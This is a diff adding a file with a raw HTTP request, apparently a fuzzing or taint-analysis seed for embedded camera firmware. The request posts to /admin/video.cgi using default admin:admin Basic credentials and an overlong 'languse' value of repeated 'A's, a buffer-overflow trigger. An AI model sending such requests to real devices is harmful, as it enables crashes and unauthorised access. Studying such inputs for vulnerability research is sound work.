@@ -1,0 +1,19 @@
+POST /admin/video.cgi HTTP/1.1
+Host: 192.168.10.30
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 445
+Origin: http://192.168.10.30
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: close
+Referer: http://192.168.10.30/admin/video.asp?en
+Upgrade-Insecure-Requests: 1
+q
+resolution2=0&quality2=4&framerate2=25&resolution0=0&quality0=4&framerate0=25&resolution1=0&quality1=1&framerate1=25&view1=0&3gppenable=0&languse=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+mark_taint_msg /admin/video.cgi languse= 0 300
